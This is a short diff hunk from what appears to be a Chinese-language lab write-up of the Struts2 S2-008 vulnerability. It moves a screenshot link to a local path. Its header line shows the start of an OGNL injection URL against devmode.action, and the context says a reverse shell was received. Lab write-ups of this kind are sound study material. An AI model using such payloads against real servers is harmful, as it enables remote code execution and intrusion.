@@ -68,5 +68,5 @@ http://your-ip:8080/S2-008/devmode.action?debug=command&expression=(%23_memberAc
 
 成功接收反弹shell：
 
-![image-20220301165140045](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203011651129.png)
+![image-20220301165140045](./images/202203011651129.png)
 
